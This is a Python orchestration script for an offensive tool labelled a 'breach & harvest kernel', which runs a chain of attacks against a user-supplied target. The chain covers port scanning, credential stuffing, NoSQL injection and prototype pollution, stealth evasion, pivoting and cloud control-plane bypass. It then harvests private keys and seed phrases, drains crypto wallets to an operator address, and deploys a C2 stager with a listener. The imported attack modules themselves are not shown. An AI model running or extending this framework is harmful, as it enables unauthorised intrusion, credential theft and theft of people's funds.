import asyncio
import sys
import time
import random
import socket
import threading
from modules.loader import load_wordlist
from modules.parser import parse_target_source
from modules.scanner import run_port_scanner
from modules.engine import run_autonomous_engine
from modules.no_sql_prototype import test_nosql_and_pollution
from modules.replayer import replay_and_inject_payloads
from modules.dumper import harvest_email_intelligence
from modules.mail import send_breach_alert
from modules.payloads import deploy_c2_stager
from modules.keyharvester import harvest_private_keys
from modules.drainer import check_and_drain_wallet
# --- Newly Integrated Advanced Modules ---
from modules.stealth_ops import run_stealth_engine
from modules.pivot import run_pivot_engine
from modules.cloud_apex import run_cloud_apex_suite
from modules.bruter import execute_active_assault_engine

# Cyberpunk Neon & Clean Structured Palette
CYAN = "\033[96m"
GREEN = "\033[92m"
MAGENTA = "\033[95m"
YELLOW = "\033[93m"
RED = "\033[91m"
DARK_GRAY = "\033[90m"
RESET = "\033[0m"
BOLD = "\033[1m"
BLINK = "\033[5m"
MATRIX_GREEN = "\033[38;5;46m"
NEON_BLUE = "\033[38;5;51m"

BANNER = f"""{MATRIX_GREEN}{BOLD}
 ██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗  ██████╗  ██████╗ 
 ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗██╔═══██╗██╔════╝ 
 ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═════╝  ╚═════╝  ╚═════╝ 
{RESET}{NEON_BLUE}═════════════════════════════════════════════════════════════
   [ROGUE_SYS // ADVANCED RED TEAM BREACH & HARVEST KERNEL V5.1]
═════════════════════════════════════════════════════════════{RESET}
"""

def cyber_print(text, delay=0.01, color=MATRIX_GREEN):
    """Types text out smoothly with automated terminal scrolling via sys.stdout."""
    for char in text:
        sys.stdout.write(f"{color}{char}{RESET}")
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write("\n")
    sys.stdout.flush()
    sys.stdout.write("\033[1S")

def validate_target_host(target_domain):
    """
    Pre-flight DNS & reachability check to prevent blind execution 
    against dead domains or invalid wildcard resolutions.
    """
    sys.stdout.write(f"\n{CYAN}[PRE-FLIGHT] → Resolving target domain: {target_domain}{RESET}\n")
    sys.stdout.flush()
    try:
        ip = socket.gethostbyname(target_domain)
        if ip in ["0.0.0.0"] and "localhost" not in target_domain:
            sys.stdout.write(f"       └── {RED}[!] FATAL: Target resolved to unroutable IP ({ip}). Aborting pipeline.{RESET}\n")
            sys.stdout.flush()
            return False, ip
        sys.stdout.write(f"       └── {GREEN}[SUCCESS] Target verified -> Resolved IP: {ip}{RESET}\n")
        sys.stdout.flush()
        return True, ip
    except socket.gaierror as e:
        sys.stdout.write(f"       └── {RED}[!] DNS RESOLUTION ERROR: Could not resolve '{target_domain}': {e}{RESET}\n")
        sys.stdout.flush()
        return False, None

def spawn_c2_listener():
    """Background listener daemon to catch stager callbacks seamlessly."""
    try:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("127.0.0.1", 4444))
        s.listen(1)
        sys.stdout.write(f"\n{GREEN}[*] C2 Listener armed on 127.0.0.1:4444 (Waiting for stager callback)...{RESET}\n")
        sys.stdout.flush()
        conn, addr = s.accept()
        sys.stdout.write(f"\n{GREEN}{BOLD}[+++] C2 HANDSHAKE CAUGHT FROM: {addr}{RESET}\n")
        sys.stdout.flush()
        while True:
            data = conn.recv(4096)
            if not data:
                break
            sys.stdout.write(data.decode(errors='ignore'))
            sys.stdout.flush()
        conn.close()
    except Exception as e:
        sys.stdout.write(f"{RED}[!] C2 Listener exception: {e}{RESET}\n")
        sys.stdout.flush()

async def async_main():
    sys.stdout.write("\033[2J\033[H")
    print(BANNER)
    
    cyber_print(f"{NEON_BLUE}[SYS_CORE] >> SECURE NEURAL INTERFACE ONLINE.{RESET}", 0.005)
    raw_target = input(f"{MATRIX_GREEN}{BOLD}[ROGUE_PROMPT] ⚡ Target Host / Domain / IP: {RESET}").strip()
    
    if not raw_target:
        cyber_print(f"{RED}[CRITICAL] Target parameter missing. Aborting protocol.{RESET}", 0.01)
        sys.exit(1)

    target = raw_target
    if target.startswith("http://"):
        target = target[7:]
    elif target.startswith("https://"):
        target = target[8:]
    target = target.split('/')[0].split(':')[0]

    # Enforce Pre-Flight Verification Gate
    is_valid, resolved_ip = validate_target_host(target)
    if not is_valid:
        cyber_print(f"{RED}[ABORT] Pre-flight target gate failed. Exiting framework safely.{RESET}", 0.01)
        sys.exit(1)

    # Clean block-tree structured output for target isolation
    sys.stdout.write(f"\n{CYAN}[TARGET 1/1] → https://{target} ({resolved_ip}){RESET}\n")
    sys.stdout.write(f"       └── [STATUS] Target isolated and locked successfully.\n")
    sys.stdout.flush()
    
    cyber_print(f"{YELLOW}[INIT] Loading offensive wordlist dictionaries...{RESET}", 0.005)
    try:
        passwords = load_wordlist("config/passwords.txt")
    except Exception as e:
        cyber_print(f"{RED}[ERROR] Wordlist mount failed: {e}{RESET}", 0.01)
        sys.exit(1)

    sys.stdout.write(f"       └── [SUCCESS] Wordlist Secured : {len(passwords)} candidate vectors loaded.\n")
    sys.stdout.flush()

    # Step 1: High-Speed Port Scanning & Service Profiling
    sys.stdout.write(f"\n{CYAN}[RECON 1/3] → Executing Asynchronous Port Profiler{RESET}\n")
    sys.stdout.flush()
    try:
        await run_port_scanner(target)
    except Exception as e:
        sys.stdout.write(f"       └── [!] Notice during port scan: {e}\n")
        sys.stdout.flush()

    # Step 2: Real-time DOM Inspection, Security Header Audit & File Credential Queueing
    sys.stdout.write(f"\n{CYAN}[RECON 2/3] → Executing DOM & Header Intelligence Scan{RESET}\n")
    sys.stdout.flush()
    try:
        await parse_target_source(target)
    except Exception as e:
        sys.stdout.write(f"       └── [!] Notice during DOM parse: {e}\n")
        sys.stdout.flush()

    # Step 2.1: Active Multi-Protocol Assault Engine
    sys.stdout.write(f"\n{CYAN}[ASSAULT] → Launching Active Multi-Protocol Assault Engine{RESET}\n")
    sys.stdout.flush()
    try:
        await execute_active_assault_engine(target)
    except Exception as e:
        sys.stdout.write(f"       └── [!] Notice during active assault dispatch: {e}\n")
        sys.stdout.flush()

    # Step 2.5: Behavioral Evasion & Stealth Jitter Wrapper
    sys.stdout.write(f"\n{CYAN}[RECON 3/3] → Engaging Stealth Telemetry & Behavioral Jitter{RESET}\n")
    sys.stdout.flush()
    try:
        await run_stealth_engine(target, paths_to_probe=["/", "/login", "/api/health"])
    except Exception as e:
        sys.stdout.write(f"       └── [!] Notice during stealth probing: {e}\n")
        sys.stdout.flush()

    # Step 3: Launch Heavy Autonomous Engine (Stateful Differential Analysis & Credential Stuffing)
    hits, duration = await run_autonomous_engine(target, passwords)

    # Step 4: NoSQL Injection & Prototype Pollution Suite
    if not hits:
        cyber_print(f"{YELLOW}[*] Primary perimeter held. Deploying NoSQL & Prototype Pollution vectors...{RESET}", 0.005)
        pollution_hits = await test_nosql_and_pollution(target)
        if pollution_hits:
            hits.extend(pollution_hits)

    # Adaptive Pivot: If zero hits, trigger neural payload replaying
    if not hits:
        cyber_print(f"{YELLOW}[*] Deploying adaptive neural payload replaying...{RESET}", 0.005)
        await replay_and_inject_payloads(target)

    # Step 4.5: Post-Exploitation Pivot & Cloud Control-Plane Bypass Suite
    sys.stdout.write(f"\n{CYAN}[PIVOT] → Initializing Autonomous Post-Exploitation & Cloud Control-Plane Suite{RESET}\n")
    sys.stdout.flush()
    try:
        await run_pivot_engine(target)
        await run_cloud_apex_suite(target)
    except Exception as e:
        sys.stdout.write(f"       └── [!] Notice during pivot execution: {e}\n")
        sys.stdout.flush()

    # Step 5: Post-Exploitation, Vault Scraping, Crypto Wallet & Asset Auditing
    cyber_print(f"\n{MATRIX_GREEN}[+] Initiating post-exploitation asset harvesting & multi-chain audit...{RESET}", 0.005)
    
    # 1. Harvest Private Keys & Seed Phrases (Local directory audit)
    keys_found = harvest_private_keys(".")
    
    # 2. Universal Multi-Asset Check & Automated Drainer Sweep
    drain_results = []
    total_artifacts = len(keys_found)
    
    for idx, key in enumerate(keys_found, 1):
        key_content = key.get("key_content")
        key_type = key.get("type")
        source_file = key.get("source")
        
        sys.stdout.write(f"\n{CYAN}[TARGET {idx}/{total_artifacts}] → {source_file}{RESET}\n")
        sys.stdout.write(f"       └── [AUDIT] Inspecting artifact type: {key_type}\n")
        sys.stdout.write(f"       └── [DATA]  Key/Seed: {key_content[:18]}...\n")
        sys.stdout.flush()
        
        try:
            total_bal, drained, tx, chain_breakdown, operator_dest = check_and_drain_wallet(key_content)
            sys.stdout.write(f"       └── [SUCCESS] Multi-Chain Balance Audited:\n")
            sys.stdout.write(f"           ├── ETH/EVM : {chain_breakdown['evm']} ETH\n")
            sys.stdout.write(f"           ├── SOL     : {chain_breakdown['sol']} SOL\n")
            sys.stdout.write(f"           ├── BTC     : {chain_breakdown['btc']} BTC\n")
            sys.stdout.write(f"           ├── LTC     : {chain_breakdown['ltc']} LTC\n")
            sys.stdout.write(f"           ├── XRP     : {chain_breakdown['xrp']} XRP\n")
            sys.stdout.write(f"           └── TRON    : {chain_breakdown['tron']} TRX\n")
            sys.stdout.write(f"       └── [ROUTING] Operator Destination: {operator_dest[:12]}...{operator_dest[-6:]}\n")
            sys.stdout.write(f"       └── [SWEEP STATUS] Drained: {drained} | TxHash: {tx[:16]}...\n")
            sys.stdout.flush()
            
            drain_results.append({
                "type": key_type,
                "artifact": key_content[:15] + "...", 
                "balance": total_bal, 
                "chains": chain_breakdown,
                "operator_destination": operator_dest,
                "drained": drained, 
                "tx": tx
            })
        except Exception as e:
            sys.stdout.write(f"       └── [!] Multi-chain asset audit error: {e}\n")
            sys.stdout.flush()

    # 3. Properly Awaited Email Intelligence, Vault Scraping & Live Terminal Alerts
    try:
        await harvest_email_intelligence(target, verified_hits=hits)
    except Exception as e:
        sys.stdout.write(f"       └── [!] Intelligence harvest notice: {e}\n")
        sys.stdout.flush()

    for hit in hits:
        try:
            send_breach_alert(target, hit)
        except Exception:
            pass
        
    # 4. Deploy Mobile C2 Stager Package with Auto-Spawned Listener Thread
    try:
        listener_thread = threading.Thread(target=spawn_c2_listener, daemon=True)
        listener_thread.start()
        time.sleep(0.5)
        
        deploy_c2_stager("127.0.0.1", 4444)
        listener_thread.join(timeout=3)
    except Exception as e:
        sys.stdout.write(f"       └── [!] C2 deployment notice: {e}\n")
        sys.stdout.flush()

    # Cyberpunk Completion Dashboard
    cyber_print(f"\n{NEON_BLUE}═════════════════════════════════════════════════════════════{RESET}", 0.003)
    cyber_print(f"{BOLD}{MATRIX_GREEN}[*] MISSION STATUS: COMPLETE (Elapsed: {duration:.2f}s){RESET}", 0.005)
    
    if hits:
        cyber_print(f"{BOLD}{BLINK}[+++] BREACH CONFIRMED: {len(hits)} authorization vectors successfully bypassed!{RESET}", 0.005)
        for idx, hit in enumerate(hits, 1):
            cyber_print(f" ├── Vector [{idx}]: Endpoint {hit.get('endpoint')} | Type: {hit.get('type')}", 0.005)
            cyber_print(f" │    Status: {hit.get('status')} | Cookies: {hit.get('cookies')[:30]}...{RESET}", 0.005)
    else:
        cyber_print(f"{YELLOW}[---] Adaptive engagement concluded. Harvest streamed live in terminal.{RESET}", 0.005)
    
    cyber_print(f"{NEON_BLUE}═════════════════════════════════════════════════════════════{RESET}\n", 0.003)

def main():
    asyncio.run(async_main())

if __name__ == "__main__":
    main()

